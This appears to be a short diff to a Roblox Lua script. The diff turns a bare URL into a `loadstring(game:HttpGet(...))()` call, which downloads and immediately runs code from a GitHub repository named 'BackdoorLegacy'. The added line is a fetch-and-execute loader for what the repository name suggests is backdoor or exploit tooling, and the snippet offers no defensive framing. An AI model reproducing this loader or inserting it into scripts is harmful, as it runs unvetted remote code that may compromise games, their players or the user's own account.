@@ -10,4 +10,4 @@ while task.wait(1) do
     end
 end
 
-https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua"))()
